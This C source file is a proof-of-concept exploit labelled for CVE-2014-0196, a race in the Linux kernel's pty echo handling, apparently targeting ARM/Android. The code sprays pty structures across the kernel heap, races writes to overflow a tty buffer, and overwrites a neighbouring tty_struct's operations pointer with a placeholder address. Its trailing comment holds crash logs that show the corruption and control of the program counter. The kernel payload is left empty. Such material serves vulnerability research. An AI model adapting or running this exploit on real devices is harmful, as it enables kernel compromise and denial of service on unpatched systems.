#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/mman.h>
#include <termios.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>

/* 

1 char at a time in this trace 

[+] in flip_string B 512
[+] in flip_string B 1
...
[+] in flip_string B 1
[+] in flip_string B 1

Like transfering between buffers ?

[<c0011bbc>] (unwind_backtrace+0x0/0xe0) from [<c01f7b28>] (tty_insert_flip_string_fixed_flag+0x34/0xb0)
[<c01f7b28>] (tty_insert_flip_string_fixed_flag+0x34/0xb0) from [<c01f8ae8>] (pty_write+0x5c/0x80)
[<c01f8ae8>] (pty_write+0x5c/0x80) from [<c01f05dc>] (tty_put_char+0x34/0x38)
[<c01f05dc>] (tty_put_char+0x34/0x38) from [<c01f361c>] (process_echoes+0x1dc/0x268)
[<c01f361c>] (process_echoes+0x1dc/0x268) from [<c01f488c>] (n_tty_receive_buf+0xc80/0xf04)
[<c01f488c>] (n_tty_receive_buf+0xc80/0xf04) from [<c01f7768>] (flush_to_ldisc+0x108/0x1c8)
[<c01f7768>] (flush_to_ldisc+0x108/0x1c8) from [<c002f290>] (process_one_work+0x25c/0x474)
[<c002f290>] (process_one_work+0x25c/0x474) from [<c002f6a8>] (worker_thread+0x1d4/0x314)
[<c002f6a8>] (worker_thread+0x1d4/0x314) from [<c003434c>] (kthread+0x80/0x90)
[<c003434c>] (kthread+0x80/0x90) from [<c000e3c8>] (kernel_thread_exit+0x0/0x8)
*/

#define MAX_FORK 9 
#define MAX_FD 900
#define TTY_MAGIC 0x5401
 
 
struct device;
struct tty_driver;
struct tty_operations;
 
typedef struct {
    int counter;
} atomic_t;
 
struct kref {
    atomic_t refcount;
};
 
struct tty_struct_header {
    int magic;
    int kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;
} overwrite;

struct manager {
	pid_t tasks[MAX_FORK];
	pid_t parent;
	pid_t sync;
	pid_t child;
	unsigned long cnt_forked;
	int sync_bombing;
};



/*---------- Global variables ----------*/

int master_fd, slave_fd;
struct manager *Manager;
pthread_mutex_t *mutex_manager;

int Sync;

char readBuf[512];
char badStr[256];
char badStr2[256];
char badStr3[256];

char scratch[1024] = {0};
void *tty_operations[64];

/*---------- Libc wrappers ----------*/

int open_pty(int *master) {
	char *slave_path;
	int slave_fd;

	if((*master = open("/dev/ptmx", O_RDWR | O_NONBLOCK)) == -1) {
		printf("errno %d\n", errno);
		perror("1");
		return -1;
	}
	if(grantpt(*master) || unlockpt(*master)) {
		perror("2");
		return -1;
	}
	slave_path = (char *) ptsname(*master);
	slave_fd = open(slave_path, O_RDWR | O_NOCTTY | O_NONBLOCK);
	if(slave_fd == -1)
		perror("3");
	return slave_fd;
}

int set_vuln_flags(int target_fd) {
	struct termios tp;

	// enable raw mode with ECHO to trigger the bug
	if(tcgetattr(target_fd, &tp) == -1)
		return -1;
	cfmakeraw(&tp); // same as tp.c_oflag &= ~OPOST;
	tp.c_lflag |=  ECHO;
	if(tcsetattr(target_fd, TCSAFLUSH, &tp) == -1)
		return -1;

	return 0;
}

void kill_all() {
	unsigned long i;
	for(i = 0; i < Manager->cnt_forked; ++i) {
		kill(Manager->tasks[i], SIGKILL);
		waitpid(Manager->tasks[i], NULL, 0);
	}
}

void sync_handler(int sig) {
	Sync = 1;
}

void error_handler(int sig) {
	kill_all();
	exit(1);
}

void setup_sig_handlers() {
	struct sigaction act;
	struct sigaction act2;

	memset(&act, 0, sizeof act);
	memset(&act2, 0, sizeof act2);

	act.sa_handler = sync_handler;
	act2.sa_handler = error_handler;

	sigaction(SIGUSR1, &act, NULL);
	sigaction(SIGUSR2, &act2, NULL);
}

// Need to think about what to do in kernel mode to show we have code exec
void payload(void) {

}

void taint_process(void) {
	__asm__("mov r7, #300\n\t"
			"add r7, #78\n\t"
			"svc #0");
}

/*---------- tasks ----------*/

void spray_fn(void) {
	int spray_master[MAX_FD/2], spray_slave[MAX_FD/2];
	int i;

	// Step 1. stabilize heap
	for(i = 0; i < MAX_FD/2; ++i) {
		spray_slave[i] = open_pty(&spray_master[i]);
		if(spray_slave[i] == -1) {
			perror("spray");
			kill(Manager->parent, SIGUSR2);
			exit(1);
		}
	}

	kill(Manager->parent, SIGUSR1);
	
	// Step 2. Wait all spray to finish before making holes or we'll fill our own holes ...
	// busy wait
	while(!Sync) usleep(10);
	Sync = 0;

	// Step 3. make holes every 6 elements
	for(i = 0; i < MAX_FD/2; i += 6) {
		close(spray_master[i]);
		close(spray_slave[i]);
	}

	kill(Manager->parent, SIGUSR1);

	// Final step. infinite loop :  
	while(1) {
		// wait parent trigger exploit
		while(!Sync) usleep(10);
		Sync = 0;
		
		// check if worked
		for(i = 1; i < MAX_FD/2; i += 6) {
			if(ioctl(spray_master[i], 0xdeadbeef) || ioctl(spray_slave[i], 0xdeadbeef)) {
				//perror("ioctl");
			}
		}
		
		// tell parent to continue, not worked ..
		kill(Manager->parent, SIGUSR1);
	}

}

void child_fn(void) {
	char discard[1024];
	int target_fd = slave_fd;

	if(set_vuln_flags(target_fd)) perror("Set vuln flags");


	while(!Manager->sync_bombing) usleep(10); // No need for mutex

	if(write(target_fd, badStr, sizeof badStr) < 0) 
		if(errno != EAGAIN)
			exit(1);

	// 2nd write
	if(write(target_fd, badStr2, sizeof badStr2) < 0) 
		if(errno != EAGAIN)
			exit(1);

	if(write(target_fd, badStr3, sizeof badStr3) < 0) 
		if(errno != EAGAIN)
			exit(1);

	// eat the incoming data
	if(read(target_fd, discard, sizeof discard) < 0)
		if(errno != EAGAIN)
			exit(1);
}

/* Increase reliability to start overflow at same time */
void sync_fn(void) {
	while(1) {
		usleep(50); 
		Manager->sync_bombing = 1; // release
		usleep(50);
		Manager->sync_bombing = 0;
	}
}

/*---------- parent init ----------*/

// fork spraying childs one after one (wait each time cf. reason below)
void fork_a_lot(void) {
	unsigned long cnt_fork = 0;
	pid_t child;

	while(cnt_fork < MAX_FORK) {
		child = fork();
		if(child == -1) {
			perror("fork spray");
			kill_all(cnt_fork);
			exit(1);
		} else if (!child) {
			spray_fn();
			exit(0);
		} else { 
			// wait for each spray to finish before spraying again / contiguous memory
			while(!Sync) usleep(10);
			Sync = 0;
			Manager->tasks[cnt_fork++] = child;
			printf("[.] %lu sprayed process\n", cnt_fork);
		}
	}

	Manager->cnt_forked = cnt_fork;
}

void dump_payload() {
	int i;

	printf("[+] payload : ");
	for(i = 0; i < (sizeof badStr2 / 4); ++i)
		printf("%#08lx-", ((unsigned long *)badStr2)[i]);
	printf("\n");
}

void set_payloads(void) {
	int i;

	overwrite.magic = TTY_MAGIC;
	overwrite.kref = 0x1337;
	overwrite.dev = (struct device *) scratch;
	overwrite.driver = (struct tty_driver *) scratch;
	overwrite.ops = (struct tty_operations *) tty_operations;

	for(i = 0; i < 64; ++i) 
		tty_operations[i] = (void *) 0x41414141; // PC control / replace with payload()

	memset(readBuf, 'A', sizeof readBuf);
	memset(badStr, 'B', sizeof badStr);
	memset(badStr2, 'C', sizeof badStr2);
	for(i = 0; i < sizeof badStr3; ++i)
		badStr3[i] = i;

	//228 is the effedtive observed value with kernel debug
	for(i = 0; i < sizeof overwrite; ++i)
		badStr3[i+0xe4] = ((char *)&overwrite)[i];
		
}

int pre_init() {
	unsigned long cnt_spray_done = 0;
	int i;

	Manager = mmap(NULL, sizeof(struct manager), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	mutex_manager = mmap(NULL, sizeof(pthread_mutex_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pthread_mutex_init(mutex_manager, NULL);

	if(Manager == MAP_FAILED || mutex_manager == MAP_FAILED) {
		perror("manager and mutex mmap");
		return -1;
	}

	Sync = 0;
	setup_sig_handlers();

	set_payloads();


	Manager->parent = getpid();
	Manager->cnt_forked = 0;

	// Do spray
	fork_a_lot(); 

	printf("[+] Waiting for holes..\n");
	for(i = 0; i < Manager->cnt_forked; ++i) {
		kill(Manager->tasks[i], SIGUSR1);
		while(!Sync) usleep(10);
		Sync = 0;
	}


	return 0;
}

/*---------- Parent ----------*/

int main() {
	int target_fd, i, cnt = 0;
	pid_t child, sync;

	// taint_process(); // For kernel debugging purpose

	printf("[+] CVE-2014-0196 DOS PoC by Fritz (@anarcheuz)");
	printf("[+] pre_init() working ..\n");
	if(pre_init()) exit(1);

	printf("[+] Bruteforce starting ..\n");
	while(1) {

		// hold
		Manager->sync_bombing = 0;

		slave_fd = open_pty(&master_fd);
		if(slave_fd == -1) {
			perror("open_pty");
			kill_all(MAX_FORK);
			exit(1);
		} 

		child = fork();

		// child process
		if(child == -1) {
			perror("fork child");
			exit(1);
		} else if (!child) {
			child_fn();
			exit(0);
		} else {

			Manager->child = child;

			// Sync process
			sync = fork();
			if(sync == -1) {
				perror("fork sync");
				exit(1);
			} else if (!sync) {
				sync_fn();
				exit(0);   
			}

			Manager->sync = sync;

			// master process
			target_fd = master_fd;


			while(!Manager->sync_bombing) usleep(10);
			if(write(target_fd, readBuf, sizeof readBuf) < 0) {
				if(errno != EAGAIN) {
					perror("master write");
					exit(1);
				}
			}

			// shovel the input 
			if(read(target_fd, readBuf, sizeof readBuf) < 0) {
				if(errno != EAGAIN) {
					perror("master read");
					exit(1);
				}
			}
		}

		if(cnt++ % 100 == 0) {
			fprintf(stderr, ".");
		}

		// kill sync and child 
		waitpid(child, NULL, __WALL);
		kill(sync, SIGKILL);
		waitpid(sync, NULL, __WALL);
		
		// ask them to verify if overflow successful
		for(i = 0; i < Manager->cnt_forked; ++i) {
			kill(Manager->tasks[i], SIGUSR1);
			while(!Sync) usleep(10);
			Sync = 0;
		}

		// Free all fds and start over..
		close(master_fd);
		close(slave_fd);
	}

	return 0;
}



/*

[-] fuck magic corrupted : 43434343-43434343-43434343-43434343-43434343-43434343-43434343-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-magic 0-0-0-0-0-0-0-ec321c1c-ec321c1c-ec0984c0-1-ec321c2c-ec321c2c-ec07fd00-ec07fd2c-0-316d7470-3335-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-a01-1-0-0-0-fff-ec322000-0-0-ec321cac-ec321cac-c01f7684-0-0-0-0-0-ec321ccc-ec321ccc-ec321cd4-ec321cd4-200-ec321ce0-ec321ce0-c01f021c-0-0-ec098488-ec098488-0-
bad magic number for tty struct (5:2) in tty_ioctl
[-] fuck magic corrupted : 43434343-43434343-43434343-43434343-43434343-43434343-43434343-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-magic 0-0-0-0-0-0-0-ec321c1c-ec321c1c-ec0984c0-1-ec321c2c-ec321c2c-ec07fd00-ec07fd2c-0-316d7470-3335-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-a01-1-0-0-0-fff-ec322000-0-0-ec321cac-ec321cac-c01f7684-0-0-0-0-0-ec321ccc-ec321ccc-ec321cd4-ec321cd4-200-ec321ce0-ec321ce0-c01f021c-0-0-ec098488-ec098488-0-
bad magic number for tty struct (5:2) in tty_ioctl
[-] fuck magic corrupted : 43434343-43434343-43434343-43434343-43434343-43434343-43434343-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-magic 0-0-0-0-0-0-0-ec321c1c-ec321c1c-ec0984c0-1-ec321c2c-ec321c2c-ec07fd00-ec07fd2c-0-316d7470-3335-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-a01-1-0-0-0-fff-ec322000-0-0-ec321cac-ec321cac-c01f7684-0-0-0-0-0-ec321ccc-ec321ccc-ec321cd4-ec321cd4-200-ec321ce0-ec321ce0-c01f021c-0-0-ec098488-ec098488-0-
bad magic number for tty struct (5:2) in tty_ioctl
[-] fuck magic corrupted : 0-0-edb7cfc0-0-0-0-0-0-0-0-ec321b28-ec321b28-0-0-0-0-0-0-0-0-ffffffff-ffffffff-4-4-ec321b60-ec321b60-0-0-0-0-0-0-0-0-0-c04d7cac-ec321b90-ec321b90-0-ec321b9c-ec321b9c-0-0-c001ae5c-0-0-20-0-c350-c350-0-0-0-0-0-0-0-0-0-0-0-0-0-0-magic 0-0-0-0-0-0-0-ec321c1c-ec321c1c-ec0984c0-1-ec321c2c-ec321c2c-ec07fd00-ec07fd2c-0-316d7470-3335-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-a01-1-0-0-0-fff-ec322000-0-0-ec321cac-ec321cac-c01f7684-0-0-0-0-0-ec321ccc-ec321ccc-ec321cd4-ec321cd4-200-ec321ce0-ec321ce0-c01f021c-0-0-ec098488-ec098488-0-
bad magic number for tty struct (5:2) in tty_ioctl
[-] fuck magic corrupted : 0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-e1529000-0-0-0-0-0-1-ec321b58-ec321b58-1-ec321b64-ec321b64-1-ec321b70-ec321b70-1-ec321b7c-ec321b7c-ec24cc00-400-200-ec321b90-ec321b90-c01f058c-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-magic 0-0-0-0-0-0-0-ec321c1c-ec321c1c-ec0984c0-1-ec321c2c-ec321c2c-ec07fd00-ec07fd2c-0-316d7470-3335-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-a01-1-0-0-0-fff-ec322000-0-0-ec321cac-ec321cac-c01f7684-0-0-0-0-0-ec321ccc-ec321ccc-ec321cd4-ec321cd4-200-ec321ce0-ec321ce0-c01f021c-0-0-ec098488-ec098488-0-
bad magic number for tty struct (5:2) in tty_ioctl
[-] fuck magic corrupted : 0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-1-ec321b58-ec321b58-1-ec321b64-ec321b64-1-ec321b70-ec321b70-1-ec321b7c-ec321b7c-ec24cc00-400-200-ec321b90-ec321b90-c01f058c-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-magic 0-0-0-0-0-0-0-ec321c1c-ec321c1c-ec0984c0-1-ec321c2c-ec321c2c-ec07fd00-ec07fd2c-0-316d7470-3335-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-a01-1-0-0-0-fff-ec322000-0-0-ec321cac-ec321cac-c01f7684-0-0-0-0-0-ec321ccc-ec321ccc-ec321cd4-ec321cd4-200-ec321ce0-ec321ce0-c01f021c-0-0-ec098488-ec098488-0-
bad magic number for tty struct (5:2) in tty_ioctl
[-] fuck magic corrupted : 0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-1-ec321b58-ec321b58-1-ec321b64-ec321b64-1-ec321b70-ec321b70-1-ec321b7c-ec321b7c-ec24cc00-400-200-ec321b90-ec321b90-c01f058c-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-magic 0-0-0-0-0-0-0-ec321c1c-ec321c1c-ec0984c0-1-ec321c2c-ec321c2c-ec07fd00-ec07fd2c-0-316d7470-3335-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-a01-1-0-0-0-fff-ec322000-0-0-ec321cac-ec321cac-c01f7684-0-0-0-0-0-ec321ccc-ec321ccc-ec321cd4-ec321cd4-200-ec321ce0-ec321ce0-c01f021c-0-0-ec098488-ec098488-0-


=============================================================================
BUG kmalloc-1024 (Not tainted): Redzone overwritten
-----------------------------------------------------------------------------

INFO: 0xe7b6a1c0-0xe7b6a1c3. First byte 0x0 instead of 0xcc
INFO: Slab 0xc0daed00 objects=15 used=15 fp=0x  (null) flags=0x4080
INFO: Object 0xe7b69dc0 @offset=7616 fp=0x  (null)

Bytes b4 e7b69db0: 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a  ZZZZZZZZZZZZZZZZ
Object e7b69dc0: 00 00 00 00 dc 9d b6 e7 dc 9e b6 e7 0d 03 00 00  ................
Object e7b69dd0: 00 01 00 00 0d 03 00 00 0d 03 00 00 43 43 43 43  ............CCCC
Object e7b69de0: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69df0: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69e00: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69e10: 43 43 43 43 43 43 42 42 42 42 42 42 42 42 42 42  CCCCCCBBBBBBBBBB
Object e7b69e20: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69e30: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69e40: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69e50: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69e60: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69e70: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69e80: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69e90: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69ea0: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69eb0: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69ec0: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69ed0: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69ee0: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69ef0: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69f00: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
Object e7b69f10: 42 42 42 42 42 42 43 43 43 43 43 43 43 43 43 43  BBBBBBCCCCCCCCCC
Object e7b69f20: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69f30: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69f40: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69f50: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69f60: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69f70: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69f80: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69f90: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69fa0: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69fb0: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69fc0: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69fd0: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69fe0: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b69ff0: 43 43 43 43 43 43 43 01 54 00 00 37 13 00 00 0c  CCCCCCC.T..7....
Object e7b6a000: 0f 09 00 0c 0f 09 00 38 43 09 00 43 43 43 43 43  .......8C..CCCCC
Object e7b6a010: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a020: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a030: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a040: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a050: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a060: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a070: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a080: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a090: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a0a0: 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
Object e7b6a0b0: 43 43 43 43 43 43 43 43 43 43 43 43 5e 41 54 5e  CCCCCCCCCCCC^AT^
Object e7b6a0c0: 40 5e 40 37 5e 53 5e 40 5e 40 5e 4c 5e 4f 09 5e  @^@7^S^@^@^L^O.^
Object e7b6a0d0: 40 5e 4c 5e 4f 09 5e 40 38 43 09 5e 40 43 43 43  @^L^O.^@8C.^@CCC
Object e7b6a0e0: 43 43 43 43 43 43 43 43 43 00 00 00 00 00 00 00  CCCCCCCCC.......
Object e7b6a0f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a140: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a1a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Object e7b6a1b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Redzone e7b6a1c0: 00 00 00 00                                      ....
Padding e7b6a1c8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Padding e7b6a1d8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
Padding e7b6a1e8: 00 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a  .ZZZZZZZZZZZZZZZ
Padding e7b6a1f8: 5a 5a 5a 5a 5a 5a 5a 5a                          ZZZZZZZZ
[<c0011bbc>] (unwind_backtrace+0x0/0xe0) from [<c00adcb0>] (check_bytes_and_report+0x88/0xe8)
[<c00adcb0>] (check_bytes_and_report+0x88/0xe8) from [<c00add54>] (check_object+0x44/0x22c)
[<c00add54>] (check_object+0x44/0x22c) from [<c036d05c>] (free_debug_processing+0xc4/0x250)
[<c036d05c>] (free_debug_processing+0xc4/0x250) from [<c036d228>] (__slab_free+0x40/0x2e4)
[<c036d228>] (__slab_free+0x40/0x2e4) from [<c01f781c>] (tty_buffer_free_all+0x18/0x4c)
[<c01f781c>] (tty_buffer_free_all+0x18/0x4c) from [<c01eee18>] (free_tty_struct+0x28/0x34)
[<c01eee18>] (free_tty_struct+0x28/0x34) from [<c002f290>] (process_one_work+0x25c/0x474)
[<c002f290>] (process_one_work+0x25c/0x474) from [<c002f6a8>] (worker_thread+0x1d4/0x314)
[<c002f6a8>] (worker_thread+0x1d4/0x314) from [<c003434c>] (kthread+0x80/0x90)
[<c003434c>] (kthread+0x80/0x90) from [<c000e3c8>] (kernel_thread_exit+0x0/0x8)
FIX kmalloc-1024: Restoring 0xe7b6a1c0-0xe7b6a1c3=0xcc


shell@generic:/ $ name : prog
warning: `main' uses 32-bit capabilities (legacy support in use)
healthd: battery l=50 v=0 t=0.0 h=2 st=2 chg=a
Unable to handle kernel paging request at virtual address 41414140
pgd = e119c000
[41414140] *pgd=00000000
Internal error: Oops: 80000005 [#1] PREEMPT ARM
CPU: 0    Not tainted  (3.4.67-g2d58ef9-dirty #123)
PC is at 0x41414140
LR is at tty_ioctl+0xb6c/0xc04
pc : [<41414140>]    lr : [<c01f25c8>]    psr: 20000033
sp : e1199ea0  ip : 00005418  fp : ed908d40
r10: e1386780  r9 : e1198000  r8 : e0d00800
r7 : bec2fc94  r6 : deadbeef  r5 : e0d00800  r4 : 00000000
r3 : 41414141  r2 : bec2fc94  r1 : deadbeef  r0 : e0d00800
Flags: nzCv  IRQs on  FIQs on  Mode SVC_32  ISA Thumb  Segment user
Control: 10c53c7d  Table: 2119c059  DAC: 00000015

LR: 0xc01f2548:
2548  e1a00007 e28d1008 e3a02050 ebff7881 e3500000 0a000031 eafffff6 e3740016
2568  1a00002e ea000005 e3570000 0a000001 e3570002 1a000001 e1a00005 eb0014d0
2588  e5953010 e5933030 e3530000 1a000007 e1a00005 eb001212 e5903000 e1a08000
25a8  e593c028 e35c0000 1a00000b ea000008 e1a00005 e1a01006 e1a02007 e12fff33
25c8  e59f308c e1500003 e1a04000 1a000013 eaffffee e3e04015 ea000008 e1a03007
25e8  e1a00005 e1a0100a e1a02006 e12fff3c e59f305c e1500003 e1a04000 0afffff4
2608  e1a00008 eb00121e ea000004 e3e04003 ea000002 e3e04018 ea000000 e3e04000
2628  e1a00004 e28dd05c e8bd85f0 c041c094 c041c09e c041c0ba c041c0d6 c0411ad6

SP: 0xe1199e20:
9e20  e1199e5c e1913800 c049cf98 e113ec00 c037496c 60000193 00000002 feffaac8
9e40  00000047 41414140 20000033 ffffffff e1199e8c c000d778 e0d00800 deadbeef
9e60  bec2fc94 41414141 00000000 e0d00800 deadbeef bec2fc94 e0d00800 e1198000
9e80  e1386780 ed908d40 00005418 e1199ea0 c01f25c8 41414140 20000033 ffffffff
9ea0  00000000 00000010 00000000 e7e4ac80 00000010 c0038d84 e794c0da 00000010
9ec0  ffffffff 7fffffff 00000001 c019256c ffffa72c 00000003 c0008d08 ffffffff
9ee0  00000000 c0039ad8 ffffffff 00040257 00000000 fff00000 00000001 00000000
9f00  e1386780 bec2fc94 deadbeef 0000017b bec2fc94 c00c20c8 00002000 c00c2c14

FP: 0xed908cc0:
8cc0  00010001 ed908cc4 ed908cc4 00000001 ed908cd0 ed908cd0 00000000 00000000
8ce0  c037dcb4 000200da c04924c0 ed908cec ed908cec 00000000 c0502740 c0502740
8d00  c0502714 5711071f 00000000 00000000 00000000 00000000 ed908d20 00000000
8d20  00200000 00000000 00000000 ed908d2c ed908d2c ed908d34 ed908d34 00000000
8d40  000521b6 00000000 00000000 00000000 c037ad80 ed878400 ed908df8 ed917578
8d60  000005bb 00000001 00500002 57110760 35a4e922 57110760 35a4e922 5711071f
8d80  35a4e922 00000000 00000000 00000000 00000000 00000000 00000007 00000001
8da0  ed908da0 ed908da0 00000000 00000000 00000000 ed908db4 ed908db4 ed908dbc

R0: 0xe0d00780:
0780  67666564 6b6a6968 6f6e6d6c 73727170 77767574 7b7a7978 7f7e7d7c 83828180
07a0  87868584 8b8a8988 8f8e8d8c 93929190 97969594 9b9a9998 9f9e9d9c a3a2a1a0
07c0  a7a6a5a4 abaaa9a8 afaeadac b3b2b1b0 b7b6b5b4 bbbab9b8 bfbebdbc c3c2c1c0
07e0  c7c6c5c4 cbcac9c8 cfcecdcc d3d2d1d0 d7d6d5d4 dbdad9d8 dfdedddc e3e2e1e0
0800  00005401 00001337 00090f0c 00090f0c 00094438 fbfaf9f8 fffefdfc 00000000
0820  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0840  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
0860  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000

R1: 0xdeadbe6f:
be6c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
be8c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
beac  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
becc  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
beec  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
bf0c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
bf2c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
bf4c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
